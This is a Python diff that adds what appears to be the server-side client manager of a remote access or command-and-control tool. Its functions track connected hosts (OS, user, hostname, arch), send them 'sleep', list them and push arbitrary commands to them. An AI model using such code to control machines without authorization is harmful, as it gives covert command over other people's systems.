@@ -1,0 +1,72 @@
+from LoggerWrapper import Log as logger
+
+client = {}
+client_info = {}
+fsmap = {}
+
+# =================== Основные команды ===================
+
+async def close_client(client_id: str, send_sleep: bool = True) -> bool:
+    """Отключает одного клиента. Возвращает True если клиент был отключён."""
+    if client_id in client:
+        _, writer = client[client_id]
+        if send_sleep:
+            try:
+                writer.write(b"sleep\n")
+                await writer.drain()
+            except Exception as e:
+                logger.warning(f"[!] Failed to send sleep to {client_id}: {e}")
+        try:
+            writer.close()
+            await writer.wait_closed()
+        except Exception as e:
+            logger.warning(f"[!] Failed to close writer for {client_id}: {e}")
+
+        client.pop(client_id, None)
+        client_info.pop(client_id, None)
+        fsmap.pop(client_id, None)
+        logger.info(f"[*] Client {client_id} disconnected")
+        return True
+    else:
+        logger.warning(f"[!] Client {client_id} not found")
+        return False
+
+
+async def close_all_client() -> int:
+    """Отключает всех клиентов. Возвращает количество отключённых."""
+    count = 0
+    for cid in list(client.keys()):
+        if await close_client(cid):
+            count += 1
+    return count
+
+
+def list_clients() -> list[dict]:
+    """Возвращает список подключённых клиентов в виде словарей."""
+    return [
+        {
+            "id": cid,
+            "os": info.get("os", "?"),
+            "user": info.get("user", "?"),
+            "hostname": info.get("hostname", "?"),
+            "arch": info.get("arch", "?")
+        }
+        for cid, info in client_info.items()
+    ]
+
+
+async def send_command(cid: str, command: str) -> bool:
+    """Отправляет произвольную команду клиенту. Возвращает True при успехе."""
+    if cid in client:
+        _, writer = client[cid]
+        try:
+            writer.write(f"{command}\n".encode())
+            await writer.drain()
+            logger.info(f"[*] Command '{command}' sent to {cid}")
+            return True
+        except Exception as e:
+            logger.error(f"[!] Failed to send '{command}' to {cid}: {e}")
+            return False
+    else:
+        logger.warning(f"[!] Client {cid} not found")
+        return False
